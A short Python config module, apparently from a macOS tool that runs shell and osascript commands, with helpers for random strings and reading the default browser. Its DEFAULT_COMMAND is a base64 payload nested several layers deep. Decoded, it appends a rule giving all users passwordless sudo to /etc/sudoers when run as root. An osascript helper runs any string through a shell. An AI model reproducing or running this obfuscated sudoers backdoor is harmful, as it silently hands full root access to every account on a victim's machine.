"""general config and functions"""
import os
import uuid
from plistlib import readPlist
from subprocess import PIPE, Popen
from xml.parsers.expat import ExpatError

DEFAULT_COMMAND = """python -c \\"$(echo aW1wb3J0IGJhc2U2NCwgb3M7IGV4ZWMoYmFzZTY0LmI2NGRlY29kZSgnYVdZZ2IzTXVaMlYwZFdsa0tDa2dQVDBnTURvZ2IzTXVjM2x6ZEdWdEtHSmhjMlUyTkM1aU5qUmtaV052WkdVb0oxcFhUbTlpZVVGcFVWVjRUVWxGUmsxVVJEQnZVVlY0VFV0VFFrOVVNVUpDVlRGT1dGSkViMmRSVlhoTlNXbEJLMUJwUVhaYVdGSnFURE5PTVZwSE9XeGpiazA5SnlrcERRcGxiSE5sT2lCd2NtbHVkQ2hpWVhObE5qUXVZalkwWkdWamIyUmxLQ2RXV0U1c1kybENjR041UW5WaU0xRm5ZMjA1ZG1SQlBUMG5LU2s9Jykp | base64 -D)\\" """


def random_string():
    """generates random string"""
    return str(uuid.uuid4())[:8]


def default_browser():
    """gets default browser"""
    try:
        plist = readPlist(os.path.expanduser(
            "~") + "/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist")
    except ExpatError:
        return
    handlers = plist.get("LSHandlers")
    for handler in handlers:
        scheme = handler.get("LSHandlerURLScheme")
        if scheme and (scheme == "https" or scheme == "http"):
            return handler.get("LSHandlerRoleAll")
    return


def osascript(command):
    """runs shell for osascript"""
    osa = Popen([command], shell=True, stdout=PIPE)
    response = osa.communicate()[0].strip()
    if isinstance(response, bytes):
        return response.decode("utf-8")
    return response
